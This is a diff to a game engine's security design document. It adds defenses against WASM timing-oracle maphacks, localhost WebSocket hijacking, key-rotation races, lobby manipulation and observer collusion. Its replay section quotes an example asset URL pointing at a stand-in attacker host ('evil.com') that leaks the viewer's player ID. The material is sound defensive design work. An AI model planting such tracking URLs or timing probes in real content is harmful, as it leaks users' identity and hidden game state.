@@ -193,6 +193,18 @@ pub enum NetworkAccess {
 
 **Key principle:** Don't expose `get_all_units()` or `get_enemy_state()`. Only expose `get_visible_units()` which checks fog. Mods literally cannot request hidden data because the function doesn't exist.
 
+**Timing oracle resistance (F5 closure):** Even without `get_all_units()`, a malicious WASM mod can infer fogged information via timing side channels. `ic_query_units_in_range()` execution time correlates with the total number of units in the spatial index (including fogged units), because the spatial query runs against world state before visibility filtering. A mod measuring host call duration across successive ticks can detect unit movement in fogged regions — a maphack that bypasses the capability model entirely.
+
+**Mitigation:** Host API functions that query spatial data must **filter by the calling player's fog-of-war before performing the query** — not filter results after the query. The query itself operates only on the visibility-filtered entity set, so execution time does not leak fogged entity count. As a defense-in-depth measure, all spatial query host calls are padded to a **constant minimum execution time** (ceiling of worst-case for the map size, sampled at map load). This ensures timing measurements reveal nothing about entity density.
+
+- "Timing oracle resistance" is a WASM host API design principle in `04-MODDING.md` § WASM Sandbox Rules
+- In fog-authoritative mode (V1), fogged entities do not exist on the client at all — this timing attack is structurally impossible. This is an additional argument for fog-authoritative in competitive play.
+- A proptest property verifies: "For any entity configuration, `ic_query_units_in_range()` execution time does not vary beyond ±5% based on fogged entity count" (see `tracking/testing-strategy.md`).
+
+**Phase:** Timing oracle resistance ships with Tier 3 WASM modding (Phase 4–6). Constant-time spatial queries are a Phase 6 exit criterion.
+
+**WASM network access denial (F10 closure):** WASM mods access the network **exclusively** through host-provided `ic_http_get()` / `ic_http_post()` imports. No WASI networking capabilities are granted. Raw socket, DNS resolution, and TCP/UDP access are never available to WASM modules. The `wasmtime::Config` must explicitly deny all WASI networking proposals — this is a Phase 4 exit criterion. Cross-reference: V43 (DNS rebinding assumes host-mediated network access; this entry confirms that assumption is enforced).
+
 ## Vulnerability 6: Replay Tampering
 
 ### The Problem
@@ -619,6 +631,34 @@ pub struct TrustFactors {
 
 **Federated trust:** In IC's federated community server model (D052), trust scores are community-scoped. A player's trust score on Community Server A is independent of their score on Community Server B (matching the cross-community reputation design in D052). The official IC ranking authority maintains the canonical trust score; community servers can maintain their own or defer to the canonical one.
 
+**Default weighting algorithm (F11 closure):** The weighting formula converting `TrustFactors` to `TrustScore.score` must be specified to prevent divergent community server implementations from undermining trust score's purpose. The default algorithm:
+
+```rust
+fn compute_trust_score(f: &TrustFactors) -> u16 {
+    // Each factor contributes a weighted component (0.0–1.0 normalized)
+    let age = (f.account_age_days.min(365) as f64 / 365.0) * 1500.0;
+    let games = (f.rated_games_played.saturating_sub(20).min(500) as f64 / 500.0) * 3000.0;
+    let seasons = (f.season_participation.min(8) as f64 / 8.0) * 1000.0;
+    let commends = (f.commend_rate.clamp(0.0, 0.5) / 0.5) * 1500.0;
+    let reports = -(f.report_rate.clamp(0.0, 0.3) / 0.3) * 2000.0;
+    let abandons = -(f.abandon_rate.clamp(0.0, 0.1) / 0.1) * 2000.0;
+    
+    // Anti-cheat points are the dominant negative factor —
+    // no positive factor can override active anti-cheat flags
+    let anti_cheat = -(f.anti_cheat_points as f64 / 25.0) * 6000.0;
+    
+    let raw = 6000.0 + age + games + seasons + commends + reports + abandons + anti_cheat;
+    raw.clamp(0.0, 12000.0) as u16
+}
+```
+
+Key design choices:
+- `account_age_days` saturates at 365 days — sitting idle longer doesn't help
+- `rated_games_played` has a dead zone: the first 20 games contribute nothing (prevents idle account trust inflation)
+- `anti_cheat_points` can drive the score to zero alone — no combination of positive factors overrides an active anti-cheat flag (5+ points = maximum penalty regardless of age/games/commends)
+- All factors apply NaN guards (F1 pipeline-wide NaN protection) before weighting
+- Community servers may adjust weights via `server_config.toml` (D064) but the default is canonical
+
 **Phase:** Trust score system ships with ranked matchmaking (Phase 5). Trust score factors are computed from the same match database as population baselines. Integration with D055's matchmaking queue is a Phase 5 exit criterion.
 
 ## Vulnerability 13: Match Result Fraud
@@ -654,6 +694,26 @@ impl RankingService {
 ```
 
 **Key:** Only relay-server-signed results update rankings.
+
+**Order-stream certification hash (F9 closure):** `replay_hash` in `CertifiedMatchResult` hashes the full replay file, which includes client-specific recording artifacts. V45 documents that `BackgroundReplayWriter` can lose frames during I/O spikes, meaning two clients recording the same match may produce different replay files (different frames lost). The V13 cross-check ("if any player also submitted a replay, verify hashes match") will always fail between clients with different frame loss patterns.
+
+**Fix:** Separate `replay_hash` from `order_stream_hash`:
+
+```rust
+pub struct CertifiedMatchResult {
+    pub match_id: MatchId,
+    pub players: Vec<PlayerId>,
+    pub result: MatchOutcome,
+    pub final_tick: u64,
+    pub duration: Duration,
+    pub final_state_hash: u64,
+    pub order_stream_hash: [u8; 32],  // SHA-256 of deterministic order stream (for certification)
+    pub replay_hash: [u8; 32],        // SHA-256 of this client's replay file (for per-file integrity)
+    pub server_signature: Ed25519Signature,
+}
+```
+
+The `order_stream_hash` covers the deterministic input (orders + ticks) that all clients agree on. The `replay_hash` covers the specific replay file for per-file integrity. Match certification uses `order_stream_hash`; replay file verification uses `replay_hash`. Cross-client verification compares `order_stream_hash` (always identical) rather than `replay_hash` (may differ due to frame loss).
 
 ## Vulnerability 14: Transport Layer Attacks (Eavesdropping & Packet Forgery)
 
@@ -760,6 +820,21 @@ pub struct ProtocolLimits {
     pub max_tactical_markers_per_player: u8,  // 10
     pub max_tactical_markers_per_team: u8,    // 30
 }
+
+**Canonical rate-limit cross-reference (D059 ↔ ProtocolLimits):**
+
+D059 defines communication rate limits by prose ("max 50 Opus frames/second", "max 3 pings per 5 seconds"). These are the *same values* as the `ProtocolLimits` struct fields above. To prevent drift between the two documents, this table is the single source of truth:
+
+| D059 Prose Description        | `ProtocolLimits` Field            | Value     |
+| ----------------------------- | --------------------------------- | --------- |
+| Max 50 Opus frames/second     | `max_voice_packets_per_second`    | 50        |
+| Max 256 bytes per Opus frame  | `max_voice_packet_size`           | 256 bytes |
+| Max 3 pings per 5 seconds     | `max_pings_per_interval`          | 3 per 5s  |
+| Max 32 draw points per stroke | `max_minimap_draw_points`         | 32        |
+| Max 10 markers per player     | `max_tactical_markers_per_player` | 10        |
+| Max 30 markers per team       | `max_tactical_markers_per_team`   | 30        |
+
+If either document changes a rate limit, the other must be updated in the same change set. Implementation: these values derive from a shared `const` block in `ic-protocol`, not duplicated literals.
 
 /// Command type dispatch uses exhaustive matching — unknown types return Err.
 fn parse_command(reader: &mut BoundedReader, cmd_type: u8) -> Result<NetCommand, ProtocolError> {
@@ -950,6 +1025,8 @@ A trusted mod author's account is compromised (or goes rogue), and a malicious u
 **Precedent:** The Minecraft **fractureiser** incident (June 2023). A malware campaign compromised CurseForge and Bukkit accounts, injecting a multi-stage downloader into popular mods. The malware stole browser credentials, Discord tokens, and cryptocurrency wallets. It propagated through the dependency chain — mods depending on compromised libraries inherited the payload. The incident affected millions of potential downloads before detection. CurseForge had SHA-256 checksums and author verification, but neither helped because the attacker *was* the authenticated author pushing a "legitimate" update.
 
 IC's WASM sandbox (Vulnerability 5) prevents runtime exploits — a malicious WASM mod cannot access the filesystem or network without explicit capabilities. But the supply chain threat is broader than WASM: YAML rules can reference malicious asset URLs, Lua scripts execute within the Lua sandbox, and even non-code resources (sprites, audio) could exploit parser vulnerabilities.
+
+**Console script coverage (F8 closure):** Workshop-shareable `.iccmd` console scripts (D058) are executable content distributed through the Workshop. They are explicitly subject to the same supply chain security as all other Workshop content: SHA-256 integrity verification, author Ed25519 signing (V49), quarantine for popular packages (V51), and anomaly detection. Console scripts execute through the command parser — they can only invoke registered commands, never arbitrary code. Each command within an `.iccmd` script respects D058's permission model: `DEV_ONLY`, `SERVER`, achievement/ranked flags apply per-command. A script containing a forbidden command (e.g., a `DEV_ONLY` command in a non-dev context) is rejected at parse time, not silently skipped.
 
 > **Lua sandbox surface:** Lua scripts are sandboxed via selective standard library loading (see `04-MODDING.md` § "Lua Sandbox Rules" for the full inclusion/exclusion table). The `io`, `os`, `package`, and `debug` modules are never loaded. Dangerous `base` functions (`dofile`, `loadfile`, `load`) are removed. `math.random` is replaced by the engine's deterministic PRNG. This approach follows the precedent set by Stratagus, which excludes `io` and `package` in release builds — IC is stricter, also excluding `os` and `debug` entirely. Execution is bounded by `LuaExecutionLimits` (instruction count, memory, host call budget). The primary defense against malicious Lua is the sandbox + capability model, not code review.
 
@@ -1156,6 +1233,19 @@ Two or more players coordinate to inflate one player's rating. Techniques includ
 - Flagged accounts are placed in a review queue (D052 community moderation). Automated restriction requires both statistical pattern match AND manual confirmation.
 
 **Phase:** Diminishing returns and distinct-opponent thresholds ship with D055's ranked system (Phase 5). Queue sniping detection Phase 5+.
+
+**Storage specification for opponent-pair tracking (audit finding F17):**
+
+The diminishing-returns system requires storing `(player_a, player_b, match_count, last_match_timestamp)` tuples in the ranking authority's SQLite database (D034). Storage model:
+
+- **Representation:** Sparse — only pairs that have actually played are stored. No pre-allocated matrix.
+- **Key:** `(min(player_a, player_b), max(player_a, player_b))` — symmetric, canonical ordering.
+- **Rolling window:** 30 days. Entries older than 30 days are pruned by a scheduled `DELETE WHERE last_match_timestamp < now() - 30d` job (daily, off-peak).
+- **Expected storage:** 10K active players × ~50 matches/season ÷ 2 (pairs) × 16 bytes/row ≈ **4 MB**. 100K players ≈ **40 MB** (sparse, not O(n²) because most players never face most others). Even pessimistic estimates stay within SQLite's operational range.
+- **Index:** Composite index on `(player_a, player_b)` for O(log n) lookup during `update_rating()`. Secondary index on `last_match_timestamp` for efficient pruning.
+- **Cleanup trigger:** The pruning job also runs after each season reset (D055), dropping all entries from the previous season.
+
+This makes the storage cost proportional to *actual matches played*, not population size squared.
 
 ## Vulnerability 27: Queue Sniping & Dodge Exploitation
 
@@ -1403,7 +1493,35 @@ impl EwmaTrafficMonitor {
 - The same guard applies to the `DualModelAssessment` score fields (`behavioral_score`, `statistical_score`, `combined`).
 - Additionally: `alpha` is validated at construction to be in `(0.0, 1.0)` exclusive. An `alpha` of exactly 0.0 or 1.0 degenerates the EWMA (no smoothing or no memory), and values outside the range corrupt the calculation.
 
-**Phase:** Ships with V17's traffic monitor implementation (Phase 5).
+**Pipeline-wide NaN guard (F1 closure):** The NaN/Inf guard pattern applies to **every** `f64` field in the anti-cheat scoring pipeline, not just `EwmaTrafficMonitor`. A NaN at any stage propagates silently because `NaN > threshold` is `false` — giving a cheater immunity. The full guard coverage is:
+
+1. `EwmaTrafficMonitor.orders_per_tick_avg` and `bytes_per_tick_avg` — guarded here (above)
+2. `DualModelAssessment.behavioral_score`, `.statistical_score`, `.combined` — NaN guard after every computation; NaN resets to `1.0` (maximum suspicion, fail-closed)
+3. `TrustFactors.report_rate`, `.commend_rate`, `.abandon_rate` — NaN guard after every ratio computation; NaN resets to the population median
+4. `PopulationBaseline.apm_p99`, `.entropy_p5` — NaN guard after every percentile recalculation; NaN retains the previous valid baseline
+
+The fail-closed principle: a NaN in `behavioral_score` or `combined` resets to `1.0` (maximum suspicion), not `0.0`. This ensures corrupted scoring **increases** scrutiny rather than granting immunity.
+
+**Alpha field encapsulation (F15 closure):** `alpha` is a private field with a validated setter. Direct struct construction is prevented via the `_private: ()` pattern (see `architecture/type-safety.md` § Validated Construction Policy). This ensures the `(0.0, 1.0)` range invariant cannot be violated after construction:
+
+```rust
+pub struct EwmaTrafficMonitor {
+    // ... public fields for reading ...
+    alpha: f64,           // private — validated at construction
+    _private: (),         // prevents direct struct construction
+}
+
+impl EwmaTrafficMonitor {
+    pub fn new(alpha: f64) -> Result<Self, ConfigError> {
+        if alpha <= 0.0 || alpha >= 1.0 {
+            return Err(ConfigError::InvalidAlpha(alpha));
+        }
+        // ... validated construction ...
+    }
+}
+```
+
+**Phase:** Ships with V17's traffic monitor implementation (Phase 5). Pipeline-wide NaN guards are a Phase 5 exit criterion.
 
 ## Vulnerability 35: SimReconciler Unbounded State Drift
 
@@ -1441,6 +1559,22 @@ fn is_sane_correction(correction: &EntityCorrection, ticks_since_sync: u64) -> b
 - If corrections are consistently rejected (>5 consecutive rejections), the reconciler escalates to `ReconcileAction::Resync` (full snapshot reload) or `ReconcileAction::Autonomous` (disconnect from authority, local sim is truth).
 
 **Planned deferral (cross-engine bounds hardening):** Deferred to `M7` (`P-Scale`) with `M7.NET.CROSS_ENGINE_BRIDGE_AND_TRUST` because Level 2+ cross-engine reconciliation is outside the `M1-M4` runtime and minimal-online slices. The constants are defined now for documentation completeness and auditability, but full bounds-hardening enforcement is **not** part of `M4` exit criteria. Validation trigger: implementation of a Level 2+ cross-engine bridge/authority path that emits reconciliation corrections.
+
+**Implementation guard (audit finding F14):** Because this bounds-checking logic is deferred, the implementation must include a compile-time reminder that prevents shipping a cross-engine bridge without the validation:
+
+```rust
+// In ic-sim's reconciler module — present from Phase 2 even though
+// cross-engine is Phase 5+. Ensures the deferral doesn't silently lapse.
+fn validate_correction(correction: &EntityCorrection, ticks_since_sync: u64) -> bool {
+    // SAFETY: This function is the bounds-checking gate from V35.
+    // If you are implementing Level 2+ cross-engine reconciliation and 
+    // this todo!() fires, you MUST implement the full bounds logic above
+    // before proceeding. See 06-SECURITY.md V35.
+    todo!("V35: implement cross-engine correction bounds checking before enabling Level 2+ reconciliation")
+}
+```
+
+The `todo!()` compiles successfully (it's a diverging macro) but panics at runtime if reached — guaranteeing that any code path invoking reconciliation will fail loudly until the bounds-checking is implemented. This is removed and replaced with the real `is_sane_correction()` logic during M7. CI integration test `test_reconciler_bounds_not_deferred` verifies the `todo!()` is absent before M7 release.
 
 ## Vulnerability 36: DualModelAssessment Trust Boundary
 
@@ -1641,6 +1775,8 @@ The replay format's `SelfContained` embedding mode includes full map data and ru
 
 **Validation pipeline:** Embedded YAML rules pass through the same `ic mod check` validation as Workshop content before the sim loads them. Invalid or out-of-range values are rejected.
 
+**External asset URL blocking (F6 closure):** Embedded YAML rules in `SelfContained` replays could contain external asset references (e.g., `faction_icon: "https://evil.com/track.png?viewer={player_id}"`). If the replay viewer's asset loader follows external URLs, the viewer's IP and identity are leaked to the attacker's server. **During replay playback of `SelfContained` replays, all external asset resolution is disabled.** Asset references resolve only against locally installed content. Remote URLs in embedded rules are ignored and replaced with a placeholder asset. This is enforced at the asset loader level, not the YAML parser — the rule is: "replay playback context = no network I/O."
+
 **Phase:** Replay security model ships with replay system (Phase 2). `SelfContained` mode with consent prompt ships Phase 5.
 
 ## Vulnerability 42: Save Game Deserialization Attacks
@@ -1723,6 +1859,8 @@ This check runs on every request, not just at capability review time.
 **Distinct order category:** Dev mode operations use a `PlayerOrder::DevCommand(DevAction)` variant that is categorically distinct from gameplay orders. The order validation system (V2/D012) rejects `DevCommand` orders if the sim's `DeveloperMode` resource is not active. This is checked in the order validation system, not at the UI layer.
 
 **Ranked exclusion:** Games with dev mode enabled cannot be submitted for ranked matchmaking (D055). Replays record the dev mode flag so spectators and tournament officials can see if cheats were used.
+
+**Dev mode toggle recording (F18 closure):** Dev mode toggles mid-game — possible in single-player — must be recorded as `PlayerOrder::DevCommand(DevAction::ToggleDevMode)` in the replay order stream, not just a per-match header flag. If dev mode is toggled mid-game, the per-match flag doesn't capture the toggling pattern. The replay viewer displays a visible indicator (e.g., "DEV" badge) whenever dev mode is active during playback, so viewers understand why instant builds or free units appear.
 
 **Phase:** Dev mode enforcement ships with multiplayer (Phase 5). Ranked exclusion is automatic via the ranked matchmaking system.
 
@@ -1809,6 +1947,32 @@ pub struct KeyRotation {
 
 **Emergency revocation:** If a player suspects compromise, they can issue an emergency rotation using their BIP-39 mnemonic to derive a recovery key. Emergency rotations take effect immediately with no grace period.
 
+**Rotation race condition defense (F3 closure):** If the old key is compromised, both the attacker and legitimate user can simultaneously issue valid `KeyRotation` messages (both signed by the old key + their own new key). This TOCTOU window requires explicit conflict resolution:
+
+1. **Monotonic `rotation_sequence_number`:** Every `KeyRotation` includes a monotonically increasing sequence number. Community servers accept only the **first valid rotation** for a given sequence number. Subsequent conflicting rotations for the same old key are rejected.
+2. **24-hour cooldown:** Non-emergency rotations have a 24-hour cooldown between operations for the same identity key. This limits the attacker's ability to race the legitimate user.
+3. **Emergency rotation always wins:** BIP-39 mnemonic-derived emergency rotations bypass the cooldown and take priority over standard rotations. If both a standard and emergency rotation arrive, the emergency rotation wins regardless of arrival order.
+4. **Conflict resolution rule:** "First valid rotation seen by the community authority wins; subsequent conflicting rotations for the same old key are rejected." If a race is detected (two rotations within the same cooldown window), the identity is frozen and requires BIP-39 emergency recovery.
+
+```rust
+pub struct KeyRotation {
+    pub old_public_key: Ed25519PublicKey,
+    pub new_public_key: Ed25519PublicKey,
+    pub rotation_timestamp: i64,
+    pub rotation_sequence_number: u64,    // monotonically increasing
+    pub reason: KeyRotationReason,
+    pub old_key_signature: Ed25519Signature,
+    pub new_key_signature: Ed25519Signature,
+}
+
+pub enum KeyRotationReason {
+    Compromised,
+    Scheduled,
+    DeviceChange,
+    Emergency { mnemonic_proof: BIP39Proof },  // bypasses cooldown
+}
+```
+
 **Phase:** Key rotation protocol ships with ranked matchmaking (Phase 5). Emergency revocation is a Phase 5 exit criterion.
 
 ## Vulnerability 48: Community Server Key Revocation Gap
@@ -1829,7 +1993,17 @@ Community servers authenticate via Ed25519 key pairs (D060), but there is no rev
 
 **Operator-initiated revocation:** Server operators can revoke their own key via a signed revocation request to the federation authority. This is useful for planned key rotation or suspected compromise.
 
-**Phase:** Community server key revocation ships with community server support (Phase 7). CRL distribution is a Phase 7 exit criterion.
+**Unknown-status policy (F4 closure):** When both CRL cache is expired AND OCSP fast-check is unreachable, the client must choose between soft-fail (proceed despite unknown revocation status) and hard-fail (block connection). Neither extreme is acceptable:
+
+| Mode                 | Policy                              | Rationale                                                                                                                                                                                            |
+| -------------------- | ----------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **Ranked matches**   | Hard-fail immediately               | Competitive integrity > availability. A revoked server must not host ranked games.                                                                                                                   |
+| **Unranked matches** | Hard-fail with 24-hour grace period | Accept the cached CRL for an additional 24 hours after TTL expiry, then hard-fail. Gives operators time to fix CRL distribution. Display warning: "Server certificate status could not be verified." |
+| **LAN / private**    | Soft-fail with warning              | Local trust, no revocation infrastructure expected. Always display warning.                                                                                                                          |
+
+This mirrors the TLS revocation world's pragmatic compromise: strict for high-stakes contexts, lenient for casual contexts, always transparent about the status. The 24-hour grace period bounds the vulnerability window while preventing CRL infrastructure outages from becoming denial-of-service against all community server connections.
+
+**Phase:** Community server key revocation ships with community server support (Phase 7). CRL distribution is a Phase 7 exit criterion. Unknown-status policy is documented in the Competitive Integrity Summary table.
 
 ## Vulnerability 49: Workshop Package Author Signing Absence
 
@@ -2048,6 +2222,148 @@ D059 (09g-interaction.md) defines RTL/BiDi sanitization for chat messages and ma
 
 **Phase:** Unified text pipeline ships with UI system (Phase 3). Pipeline coverage for all user-text contexts is a Phase 3 exit criterion.
 
+## Vulnerability 57: ICRP Local WebSocket Cross-Site WebSocket Hijacking (CSWSH)
+
+### The Problem
+
+**Severity: HIGH**
+
+D071 (IC Remote Protocol) exposes a JSON-RPC 2.0 API over WebSocket on localhost for local tool integration (MCP server for LLM coaching, LSP server for mod development, debug overlay). A malicious web page opened in the user's browser can initiate a WebSocket connection to `ws://localhost:<port>` — the browser sends the page's cookies and the WebSocket handshake does not enforce same-origin policy by default. This is Cross-Site WebSocket Hijacking (CSWSH).
+
+If the ICRP server accepts any incoming WebSocket connection without origin validation, a malicious page can:
+- Read game state (fog-filtered for observer tier, but still leaks match information)
+- Issue commands at the user's permission tier (if the local session has admin/mod permissions)
+- Exfiltrate replay data, player statistics, or configuration
+
+**Real-world precedent:** Jupyter Notebook, VS Code Live Share, and Electron apps have all patched CSWSH vulnerabilities in local WebSocket servers. The attack requires only that the user visits a malicious page while the game is running.
+
+### Defense
+
+**Origin header validation (mandatory):**
+
+```rust
+fn validate_websocket_upgrade(request: &HttpRequest) -> Result<(), IcrpError> {
+    let origin = request.header("Origin");
+    match origin {
+        // No Origin header — non-browser client (curl, MCP, LSP). Allow.
+        None => Ok(()),
+        // Localhost origins — same-machine tools. Allow.
+        Some(o) if o.starts_with("http://localhost") 
+               || o.starts_with("http://127.0.0.1")
+               || o.starts_with("http://[::1]")
+               || o == "null" => Ok(()),
+        // Any other origin — browser page from a different site. Reject.
+        Some(o) => {
+            tracing::warn!("CSWSH attempt blocked: origin={}", o);
+            Err(IcrpError::ForbiddenOrigin)
+        }
+    }
+}
+```
+
+**Challenge secret file:**
+
+For elevated permission tiers (admin, mod, debug), the ICRP server generates a random 256-bit challenge secret and writes it to `<data_dir>/icrp-secret` with restrictive file permissions (0600 on Unix, user-only ACL on Windows). Connecting clients must present this secret in the first JSON-RPC message. A browser-based CSWSH attack cannot read local files, so this blocks privilege escalation even if origin validation is bypassed.
+
+**HTTP fallback CORS whitelist:**
+
+The HTTP fallback endpoint (D071) applies standard CORS headers: `Access-Control-Allow-Origin: http://localhost:<port>` (not `*`). Pre-flight `OPTIONS` requests validate the origin before processing.
+
+**Additional hardening:**
+
+- ICRP binds to `127.0.0.1` only by default. Binding to `0.0.0.0` requires explicit `--icrp-bind-all` flag with a console warning.
+- WebSocket connections from browser origins (any `Origin` header present) are limited to observer-tier permissions regardless of challenge secret. Full permissions require a non-browser client (no `Origin` header).
+- Rate limit: max 5 failed challenge attempts per minute per IP. Exceeding triggers 60-second lockout.
+
+**Phase:** Ships with ICRP implementation (Phase 5). Origin validation and challenge secret are Phase 5 exit criteria. CSWSH is added to the threat model checklist for any future localhost-listening service.
+
+## Vulnerability 58: Lobby Host Configuration Manipulation
+
+### The Problem
+
+**Severity: MEDIUM**
+
+The lobby host selects game configuration (map, game speed, starting units, crates, fog settings, balance preset). In ranked play, certain configurations are restricted to the ranked whitelist (D055). But in unranked lobbies, a malicious host could:
+- Change settings silently after players have readied up (race condition between ready confirmation and game start)
+- Set configurations that advantage the host (e.g., changing starting position after seeing the map)
+- Modify settings that affect ranked eligibility without clear indication to other players
+
+### Defense
+
+**Settings change notification:**
+
+- Every lobby setting change emits a `LobbySettingChanged { key, old_value, new_value, changed_by }` message to all connected clients. The client UI displays a visible notification (toast + chat-style log entry) for each change.
+- If any setting changes after a player has readied up, that player's ready status is automatically reset with a notification: "Settings changed — please re-confirm ready."
+
+**Ranked configuration whitelist:**
+
+- Ranked lobbies enforce a strict whitelist of allowed configurations defined in the ranking authority's `server_config.toml` (D064). The host cannot modify restricted settings when the lobby is marked as ranked.
+- Settings outside the whitelist are grayed out in the lobby UI with a tooltip: "Locked for ranked play."
+- The whitelist is versioned and signed by the ranking authority. Clients validate the whitelist version on lobby join.
+
+**Match metadata recording:**
+
+- All lobby settings at the moment of game start are recorded in the `CertifiedMatchResult` (V13) by the relay server. The ranking authority validates that recorded settings match the ranked whitelist before accepting the match result.
+- This provides an audit trail — if a host exploits a race condition to change settings between ready and start, the recorded settings reveal the discrepancy.
+
+**Phase:** Lobby setting notifications ship with lobby system (Phase 3). Ranked whitelist enforcement ships with ranked system (Phase 5). Match metadata recording ships with relay certification (Phase 5).
+
+## Vulnerability 59: Ranked Spectator Minimum Delay Enforcement
+
+### The Problem
+
+**Severity: MEDIUM**
+
+Observers in lockstep RTS games receive the full game state (all player orders). Without a delay, a spectator colluding with a player could relay opponent positions and orders in real time — effectively a maphack via social channel. D060 mentions observer delay as a concept but does not specify a minimum floor for ranked play.
+
+### Defense
+
+**Mandatory minimum observer delay for ranked matches:**
+
+- Ranked matches enforce a **minimum 120-second (3,600-tick at 30 tps) observer delay**. This is a `ProtocolLimits`-style hard floor — not configurable below 120s by lobby settings, server config, or console commands.
+- Implementation: The relay server buffers observer-bound state updates and releases them only after the delay window. The buffer is per-observer, not shared — each observer's view is independently delayed.
+- The 120-second floor is chosen because it exceeds the tactical relevance window for most RTS engagements (build order scouting is revealed by 2 minutes anyway, and active combat decisions have ~5-10 second relevance).
+
+**Tiered delay policy:**
+
+| Context         | Minimum Delay | Configurable Above Floor |
+| --------------- | ------------- | ------------------------ |
+| Ranked match    | 120 seconds   | Yes (host can increase)  |
+| Unranked match  | 0 seconds     | Yes (host sets freely)   |
+| Tournament mode | 180 seconds   | Server operator sets     |
+| Replay playback | N/A           | Full speed available     |
+
+**Enforcement point:** The relay server is authoritative for observer delay — the client cannot bypass it by modifying local configuration. The delay value for each match is recorded in the `CertifiedMatchResult` metadata.
+
+**Cross-reference:** D055 (ranked exit criteria — add observer delay to ranked integrity checklist), D060 (netcode parameter philosophy — observer delay is Tier 3, always-on for ranked), V13 (match certification metadata).
+
+**Phase:** Observer delay enforcement ships with spectator system (Phase 5). The 120-second ranked floor is a Phase 5 exit criterion for D055.
+
+## Vulnerability 60: Observer Mode RNG State Prediction
+
+### The Problem
+
+**Severity: LOW**
+
+In lockstep multiplayer, all clients (including observers) process the same deterministic simulation. An observer therefore has access to the RNG state and can predict future random outcomes (e.g., damage rolls, crate spawns, scatter patterns). A colluding observer could inform a player of upcoming favorable/unfavorable RNG outcomes.
+
+This is an inherent limitation of lockstep architecture — the RNG state is derivable from the simulation state that all participants share.
+
+### Defense
+
+**Acknowledged limitation with layered mitigations:**
+
+This vulnerability is **not fully closable** in lockstep architecture without server-authoritative RNG (which would require a fundamentally different network model). Instead, layered mitigations reduce the practical impact:
+
+1. **Ranked observer delay (V59):** The 120-second delay makes RNG prediction tactically irrelevant — by the time the observer sees the state, the predicted outcomes have already resolved.
+2. **Fog-authoritative server (for high-stakes play):** In fog-authoritative mode, observers receive only visibility-filtered state, which limits (but does not fully eliminate) RNG state inference. This is the recommended mode for tournaments.
+3. **RNG state opacity:** The sim's PRNG (deterministic, seedable) does not expose its internal state through any API observable to mods or scripts. Prediction requires reverse-engineering the PRNG sequence from observed outcomes — feasible but requires significant effort per-match.
+4. **Post-match detection:** If a player consistently exploits predicted RNG outcomes (e.g., always attacking when the next damage roll is favorable), the behavioral model (V12) can detect the unnatural correlation between action timing and RNG outcomes over a sufficient sample of matches.
+
+**Documentation note:** This is a known-and-accepted limitation common to all lockstep RTS games (SC2, AoE2, original C&C). No lockstep game has solved generic RNG prediction because the simulation state is, by design, shared. The fog-authoritative server eliminates this class entirely for any deployment willing to run server-side simulation.
+
+**Phase:** Documentation only (no implementation change). Observer delay (V59) and fog-authoritative server provide the practical mitigations.
+
 ## Path Security Infrastructure
 
 All path operations involving untrusted input — archive extraction, save game loading, mod file references, Workshop package installation, replay resource extraction, YAML asset paths — require boundary-enforced path handling that defends against more than `..` sequences.
@@ -2144,6 +2460,10 @@ Iron Curtain's anti-cheat is **architectural, not bolted on.** Every defense eme
 | False accusations                          | Tiered thresholds + calibration + graduated resp  | Anti-cheat false-positive control (V54)  |
 | Bug-as-cheat                               | Desync fingerprint + classification heuristic     | Desync classification (V55)              |
 | BiDi text injection                        | Unified sanitization pipeline + context registry  | Text safety (V56)                        |
+| ICRP local CSWSH                           | Origin validation + challenge secret + bind local | ICRP WebSocket hardening (V57)           |
+| Lobby host manipulation                    | Change notification + ranked whitelist + metadata | Lobby integrity (V58)                    |
+| Ranked spectator ghosting                  | 120s minimum delay floor + relay-enforced buffer  | Observer delay enforcement (V59)         |
+| Observer RNG prediction                    | Delay + fog-auth + behavioral detection           | Lockstep limitation (V60, acknowledged)  |
 
 **No kernel-level anti-cheat.** Open-source, cross-platform, no ring-0 drivers. We accept that lockstep RTS will always have a maphack risk in client-sim modes — the fog-authoritative server is the real answer for high-stakes play.
 
